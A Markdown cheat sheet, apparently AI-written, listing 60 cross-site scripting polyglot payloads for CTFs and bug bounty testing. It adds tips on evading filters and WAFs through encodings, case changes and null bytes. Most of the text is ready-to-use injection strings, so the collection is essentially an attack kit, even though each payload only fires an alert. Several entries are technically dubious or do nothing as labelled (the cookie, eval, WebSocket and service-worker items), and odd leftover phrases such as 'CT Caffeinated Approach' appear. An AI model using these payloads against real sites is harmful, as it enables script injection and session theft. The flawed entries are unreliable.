# Ultimate XSS Polyglot Payloads for Ethical Bug Hunting & CTF

This collection provides 60 advanced polyglot payloads for Capture The Flag (CTF) challenges and authorized bug bounty programs. Designed to work across multiple contexts (HTML, JavaScript, CSS, SVG, JSON, XML, DOM, and more), these payloads help test for Cross-Site Scripting (XSS) vulnerabilities while bypassing common filters and Web Application Firewalls (WAFs). Each payload triggers a benign `alert('CTF')` to confirm execution without causing harm.

## Usage Guidelines
- **Ethical Use Only**: Use these payloads only in environments where you have explicit permission (e.g., CTFs, bug bounty programs with clear scope). Unauthorized testing is illegal and unethical.
- **Context Testing**: Inject payloads into various input points (URL parameters, form inputs, headers, APIs) to maximize coverage.
- **Filter Evasion**: Combine with encoding (e.g., URL, HTML entities, Unicode), case variation, or whitespace manipulation to bypass filters.
- **Tool Integration**: Use tools like Burp Suite, OWASP ZAP, or Wireshark to automate injections and analyze responses.
- **Responsible Testing**: Minimize impact by using benign alerts and report findings immediately without further exploitation.
- **CTF Strategy**: Leverage payloads incrementally, starting with simple ones to map sanitization weaknesses, and use tools like YARA for pattern matching in CTF challenges.

## Payload Categories

### JavaScript/HTML Polyglots
1. **Universal Context Breaker**  
   ```
   javascript://%0d%0aalert('CTF')//%0d%0a--></script><svg/onload=alert('CTF')>
   ```
   - **Contexts**: JavaScript, HTML, SVG, comments, URL.
   - **Use Case**: Escapes multiple contexts; ideal for URL parameters or script tags.

2. **Multi-Event Polyglot**  
   ```
   " onmouseover=alert('CTF') onfocus=alert('CTF') autofocus//<svg onload=alert('CTF')>
   ```
   - **Contexts**: HTML attributes, SVG, comments.
   - **Use Case**: Tests multiple event handlers in form inputs.

3. **Template Literal Injection**  
   ```
   ${alert('CTF')}//</script><svg onload=alert('CTF')>
   ```
   - **Contexts**: JavaScript templates, HTML, SVG.
   - **Use Case**: Targets ES6 template literal reflections.

4. **Script and SVG Combo**  
   ```
   <script>alert('CTF')</script><svg onload=alert('CTF')>
   ```
   - **Contexts**: JavaScript, HTML, SVG.
   - **Use Case**: Tests direct script and SVG rendering.

5. **Comment Breakout**  
   ```
   <!--><svg onload=alert('CTF')//-->
   ```
   - **Contexts**: Comments, HTML, SVG.
   - **Use Case**: Escapes HTML comment contexts.

6. **Iframe Srcdoc Polyglot**  
   ```
   <iframe srcdoc="<svg onload=alert('CTF')>"></iframe>
   ```
   - **Contexts**: HTML, iframe, SVG.
   - **Use Case**: Tests iframe srcdoc attributes.

7. **Mixed Comment Styles**  
   ```
   /*<!--//--><svg onload=alert('CTF')>
   ```
   - **Contexts**: Comments, HTML, SVG.
   - **Use Case**: Tests nested comment handling.

### HTML Entity & Encoding Polyglots
8. **Double-Encoded JavaScript**  
   ```
   %256a%2561%2576%2561%2573%2563%2572%2569%2570%2574:alert('CTF')
   ```
   - **Contexts**: JavaScript, URL, attributes.
   - **Use Case**: Bypasses aggressive WAFs with double URL encoding.

9. **Unicode Script Injection**  
   ```
   \u003cscript\u003ealert('CTF')\u003c/script\u003e
   ```
   - **Contexts**: JavaScript, HTML.
   - **Use Case**: Bypasses `<script>` tag filters.

10. **Hex-Encoded Event Handler**  
    ```
    \x6f\x6e\x6c\x6f\x61\x64=alert('CTF')//<svg>
    ```
    - **Contexts**: Attributes, HTML, SVG.
    - **Use Case**: Hex-encoded event handler bypass.

11. **HTML Entity Attribute Escape**  
    ```
    &#x27;><svg onload=alert('CTF')>
    ```
    - **Contexts**: Attributes, HTML, SVG.
    - **Use Case**: Escapes single-quoted attributes.

12. **UTF-7 Obfuscation**  
    ```
    +ADw-script+AD4-alert('CTF')+ADw-/script+AD4-
    ```
    - **Contexts**: HTML, JavaScript.
    - **Use Case**: Tests UTF-7 encoding bypass in legacy systems.

13. **Mixed Encoding Tag**  
    ```
    <scr&#x69;pt>alert('CTF')</scr&#x69;pt>
    ```
    - **Contexts**: HTML, JavaScript.
    - **Use Case**: Combines HTML entities and standard tags.

14. **Decimal Encoded Script**  
    ```
    &#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert('CTF')&#60;/&#115;&#99;&#114;&#105;&#112;&#116;&#62;
    ```
    - **Contexts**: HTML, JavaScript.
    - **Use Case**: Bypasses decimal-encoded tag filters.

### CSS Injection Polyglots
15. **CSS Background URL**  
    ```
    background:url('javascript:alert("CTF")')//</style><svg onload=alert('CTF')>
    ```
    - **Contexts**: CSS, HTML, JavaScript, SVG.
    - **Use Case**: Tests CSS injection in style attributes.

16. **CSS Import Injection**  
    ```
    @import"javascript:alert('CTF')";//</style><svg onload=alert('CTF')>
    ```
    - **Contexts**: CSS, HTML, JavaScript, SVG.
    - **Use Case**: Tests CSS import vulnerabilities.

17. **CSS Keyframe Polyglot**  
    ```
    @keyframes x{from{x:alert('CTF')}}//</style><svg onload=alert('CTF')>
    ```
    - **Contexts**: CSS, HTML, JavaScript, SVG.
    - **Use Case**: Tests CSS keyframe injections.

18. **CSS URL Function**  
    ```
    url('javascript:alert("CTF")')//<svg onload=alert('CTF')>
    ```
    - **Contexts**: CSS, HTML, JavaScript, SVG.
    - **Use Case**: Tests CSS URL function injections.

19. **Style Tag Breakout**  
    ```
    </style><script>alert('CTF')</script><svg onload=alert('CTF')>
    ```
    - **Contexts**: Style tags, HTML, JavaScript, SVG.
    - **Use Case**: Escapes `<style>` reflections.

### Advanced Multi-Context Polyglots
20. **JSON Breakout**  
    ```
    {"x":"\"};alert('CTF');//","y":""}
    ```
    - **Contexts**: JSON, JavaScript, HTML.
    - **Use Case**: Escapes JSON reflections into JavaScript contexts.

21. **XML CDATA Escape**  
    ```
    <![CDATA[><svg onload=alert('CTF')>]]>
    ```
    - **Contexts**: XML, HTML, SVG.
    - **Use Case**: Tests XML CDATA handling.

22. **SVG XML Injection**  
    ```
    <svg xmlns="http://www.w3.org/2000/svg" onload="alert('CTF')"/>
    ```
    - **Contexts**: SVG, XML, HTML.
    - **Use Case**: Tests SVG rendering in XML contexts.

23. **MathML Polyglot**  
    ```
    <math href="javascript:alert('CTF')">CLICKME</math>
    ```
    - **Contexts**: MathML, HTML, JavaScript.
    - **Use Case**: Tests MathML href attributes.

24. **Template Engine Polyglot**  
    ```
    {{alert('CTF')}}<%=alert('CTF')%><svg onload=alert('CTF')>
    ```
    - **Contexts**: Template engines (e.g., Handlebars, ERB), HTML, JavaScript.
    - **Use Case**: Tests server-side template injections.

25. **Base64 SVG Data URI**  
    ```
    data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ0NURicpPg==
    ```
    - **Contexts**: Data URLs, SVG, HTML.
    - **Use Case**: Tests base64-encoded SVG in image or iframe src.

26. **Form Action Polyglot**  
    ```
    <form action=javascript:alert('CTF')><input type=submit>
    ```
    - **Contexts**: HTML, JavaScript, forms.
    - **Use Case**: Tests form action attributes.

### Protocol Handler Polyglots
27. **JavaScript Protocol**  
    ```
    javascript:alert('CTF')
    ```
    - **Contexts**: JavaScript, URL.
    - **Use Case**: Tests direct JavaScript URI handling.

28. **Data Protocol Script**  
    ```
    data:text/html,<script>alert('CTF')</script>
    ```
    - **Contexts**: Data URLs, HTML, JavaScript.
    - **Use Case**: Tests data URI in links or iframes.

29. **Data JavaScript URI**  
    ```
    data:text/javascript,alert('CTF')
    ```
    - **Contexts**: Data URLs, JavaScript.
    - **Use Case**: Tests JavaScript execution via data URI.

30. **About Protocol SVG**  
    ```
    about:<svg onload=alert('CTF')>
    ```
    - **Contexts**: HTML, SVG.
    - **Use Case**: Tests about: protocol handling (niche).

31. **Mixed Case Protocol**  
    ```
    JaVaScRiPt:alert('CTF')//<svg onload=alert('CTF')>
    ```
    - **Contexts**: JavaScript, HTML, SVG.
    - **Use Case**: Bypasses case-sensitive filters.

### DOM Clobbering Polyglots
32. **Name Clobbering**  
    ```
    <form id="alert"><input name="1" value="alert('CTF')">
    ```
    - **Contexts**: HTML, DOM.
    - **Use Case**: Tests DOM clobbering via form elements.

33. **InnerHTML Injection**  
    ```
    element.innerHTML='<img src=x onerror=alert("CTF")>'
    ```
    - **Contexts**: JavaScript, HTML, DOM.
    - **Use Case**: Tests DOM manipulation vulnerabilities.

34. **Document Write Polyglot**  
    ```
    document.write('<script>alert("CTF")</script>')
    ```
    - **Contexts**: JavaScript, HTML, DOM.
    - **Use Case**: Tests document.write injections.

35. **Eval Breakout**  
    ```
    eval('al'+'ert("CTF")')
    ```
    - **Contexts**: JavaScript, DOM.
    - **Use Case**: Tests eval-based code execution.

36. **Function Constructor**  
    ```
    Function('alert("CTF")')()
    ```
    - **Contexts**: JavaScript, DOM.
    - **Use Case**: Tests dynamic function creation.

### Filter Bypass Polyglots
37. **Case Variation Script**  
    ```
    <ScRiPt>alert('CTF')</ScRiPt>
    ```
    - **Contexts**: HTML, JavaScript.
    - **Use Case**: Bypasses case-sensitive filters.

38. **Whitespace Bypass**  
    ```
    <script >alert('CTF')</script>
    ```
    - **Contexts**: HTML, JavaScript.
    - **Use Case**: Tests whitespace tolerance in parsers.

39. **Null Byte Injection**  
    ```
    <script%00>alert('CTF')</script>
    ```
    - **Contexts**: HTML, JavaScript.
    - **Use Case**: Tests null byte filter evasion.

40. **Tab Injection**  
    ```
    <script\t>alert('CTF')</script>
    ```
    - **Contexts**: HTML, JavaScript.
    - **Use Case**: Tests tab character bypass.

41. **Line Break Injection**  
    ```
    <script
    >alert('CTF')</script>
    ```
    - **Contexts**: HTML, JavaScript.
    - **Use Case**: Tests line break tolerance.

### Advanced Web API Polyglots
42. **Service Worker Hijack**  
    ```
    navigator.serviceWorker.register('data:application/javascript,alert("CTF")')
    ```
    - **Contexts**: JavaScript, Service Worker.
    - **Use Case**: Tests service worker registration.

43. **WebSocket Injection**  
    ```
    new WebSocket('ws://example.com/alert("CTF")')
    ```
    - **Contexts**: JavaScript, WebSocket.
    - **Use Case**: Tests WebSocket URL handling.

44. **PostMessage Exploit**  
    ```
    postMessage('alert("CTF")','*')
    ```
    - **Contexts**: JavaScript, DOM.
    - **Use Case**: Tests cross-window messaging.

45. **LocalStorage XSS**  
    ```
    <script>eval(localStorage.getItem('xss'))</script>
    ```
    - **Contexts**: JavaScript, HTML, DOM.
    - **Use Case**: Tests localStorage-based XSS.

46. **Cookie Injection**  
    ```
    document.cookie='xss=alert("CTF");path=/'
    ```
    - **Contexts**: JavaScript, DOM.
    - **Use Case**: Tests cookie-based code execution.

47. **History Manipulation**  
    ```
    history.pushState({},'','javascript:alert("CTF")')
    ```
    - **Contexts**: JavaScript, DOM.
    - **Use Case**: Tests history API manipulation.

48. **Window Open Exploit**  
    ```
    window.open('javascript:alert("CTF")')
    ```
    - **Contexts**: JavaScript, DOM.
    - **Use Case**: Tests window.open URI handling.

### Special Context Polyglots
49. **Markdown Injection**  
    ```
    [Click me](javascript:alert('CTF'))
    ```
    - **Contexts**: Markdown, JavaScript.
    - **Use Case**: Tests Markdown rendering in CMS.

50. **URL Parameter XSS**  
    ```
    https://example.com?param=<script>alert('CTF')</script>
    ```
    - **Contexts**: URL, HTML, JavaScript.
    - **Use Case**: Tests URL parameter reflections.

51. **HTTP Header Injection**  
    ```
    Location:javascript:alert('CTF')
    ```
    - **Contexts**: HTTP headers, JavaScript.
    - **Use Case**: Tests header-based redirects.

52. **SQL+XSS Combo**  
    ```
    ' OR 1=1; -- <script>alert('CTF')</script>
    ```
    - **Contexts**: SQL, HTML, JavaScript.
    - **Use Case**: Tests combined SQL and XSS injections in CTFs.

53. **File Upload Bypass**  
    ```
    <script>alert('CTF')</script>.png
    ```
    - **Contexts**: File uploads, HTML, JavaScript.
    - **Use Case**: Tests file upload parsing vulnerabilities.

54. **Original Requested Polyglot**  
    ```
    /*-/*/*\/*'/*"/**/(/* */onerror=alert('CTF') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('CTF')//>\x3e
    ```
    - **Contexts**: JavaScript, HTML, SVG, comments, attributes.
    - **Use Case**: Multi-context payload for advanced filter bypass.

55. **SVG Animation Event**  
    ```
    <svg><animate onbegin=alert('CTF')>
    ```
    - **Contexts**: SVG, HTML.
    - **Use Case**: Tests SVG animation event handlers.

56. **Object Tag Injection**  
    ```
    <object data=javascript:alert('CTF')></object>
    ```
    - **Contexts**: HTML, JavaScript.
    - **Use Case**: Tests object tag data attributes.

57. **Embed Tag Polyglot**  
    ```
    <embed src=javascript:alert('CTF')>
    ```
    - **Contexts**: HTML, JavaScript.
    - **Use Case**: Tests embed tag src attributes.

58. **Base Tag Hijack**  
    ```
    <base href=javascript:alert('CTF')//>
    ```
    - **Contexts**: HTML, JavaScript.
    - **Use Case**: Tests base tag manipulation.

59. **Meta Refresh Polyglot**  
    ```
    <meta http-equiv=refresh content=0;url=javascript:alert('CTF')>
    ```
    - **Contexts**: HTML, JavaScript.
    - **Use Case**: Tests meta tag redirects.

60. **Dynamic Import Polyglot**  
    ```
    import('data:application/javascript,alert("CTF")')
    ```
    - **Contexts**: JavaScript, HTML.
    - **Use Case**: Tests ES6 dynamic import vulnerabilities.

## Advanced Testing Tips
- **Incremental Testing**: Start with simple payloads (e.g., #4, #8) and escalate to complex ones (e.g., #54, #60) to map sanitization weaknesses.
- **Tool Synergy**: Use Burp Suite for automated injections, OWASP ZAP for DOM analysis, or Wireshark for network traffic inspection, aligning with your experience in cybersecurity tools.
- **Context Analysis**: Inspect DOM (via browser DevTools) or network responses (via Wireshark) to understand payload triggers.
- **Filter Evasion**: Experiment with mixed encodings, null bytes (`\x00`), or whitespace variations to bypass WAFs.
- **CT Caffeinated Approach**: Combine payloads with YARA-like pattern matching or Snort rule logic to identify vulnerable endpoints in CTF challenges.
- **Browser Testing**: Test payloads in Chrome, Firefox, and Safari to account for parser differences.
- **Resources**: Explore [Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/) and [HackVault](https://github.com/0xsobky/HackVault) for additional payload inspiration.

## Legal & Ethical Use
These payloads are provided for:
- Security research in authorized environments.
- Bug bounty programs with explicit scope.
- CTF challenges.
- Educational purposes.

**Always obtain proper authorization before testing any system.** Unauthorized use is illegal and unethical. Report vulnerabilities responsibly to contribute to a safer digital environment.

## File Information
- **Total Payloads**: 60
- **Categories**: 9
- **File Format**: Markdown (.md)
- **Created For**: Ethical bug hunting and CTF challenges
- **Created On**: August 23, 2025
